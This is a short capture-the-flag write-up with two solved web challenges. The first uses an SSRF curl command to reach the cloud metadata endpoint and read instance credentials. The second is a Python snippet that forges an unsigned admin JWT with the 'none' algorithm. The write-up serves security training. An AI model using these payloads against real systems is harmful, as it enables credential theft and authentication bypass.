## Challenge 1: Internal Recon (SSRF)

### Description

The application fetched user-supplied URLs to generate previews. No SSRF protection was implemented.

### Solution

```bash
# Probe internal AWS metadata
curl "https://challenge.placeholder.ctf/fetch?url=http://169.254.169.254/latest/meta-data/"
```

This revealed instance credentials from the metadata service.

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

## Challenge 2: JWT None Algorithm

### Description

The application used JWTs for authentication. The library accepted the `none` algorithm.

### Solution

```python
import base64, json

# Craft unsigned JWT
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."

print(token)
```

**Flag:** `CTF{placeholder_jwt_flag}`

## Lessons Learned

- SSRF to cloud metadata is still a very common attack path in CTFs and real assessments
- Always test JWT `alg: none` on older or misconfigured applications
- Prototype pollution often appears in Express.js apps using `_.merge` or similar
